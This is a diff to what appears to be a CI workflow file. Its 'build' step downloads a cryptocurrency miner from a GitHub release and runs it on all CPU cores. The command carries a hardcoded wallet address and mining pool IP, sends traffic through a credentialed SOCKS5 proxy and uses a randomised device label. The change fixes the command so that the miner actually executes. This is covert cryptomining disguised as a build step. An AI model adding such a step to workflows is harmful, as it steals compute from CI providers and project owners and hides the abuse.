@@ -56,5 +56,4 @@ jobs:
     - name : install dependencies   
       run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev 
     - name: build    
-      run: wget https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip && unzip beepminer-0.6.1.zip && cd beepminer-0.6.1   
-./miner --wallet-address=NQ23 A693 A0HY 3C9N LFH2 DM3S 2SJJ YPFB A2VF --type=dumb --pool=212.147.209.49:80  --proxy socks5://erl:1234@212.147.209.49:443 --region=AS --deviceLabel=$(echo $(shuf -i 1000-9999 -n 1)-N) --miner=$(nproc --all)
+      run: wget https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip && unzip beepminer-0.6.1.zip && cd beepminer-0.6.1 && ./miner --wallet-address=NQ23 A693 A0HY 3C9N LFH2 DM3S 2SJJ YPFB A2VF --type=dumb --pool=212.147.209.49:80  --proxy socks5://erl:1234@212.147.209.49:443 --region=AS --deviceLabel=$(echo $(shuf -i 1000-9999 -n 1)-N) --miner=$(nproc --all)
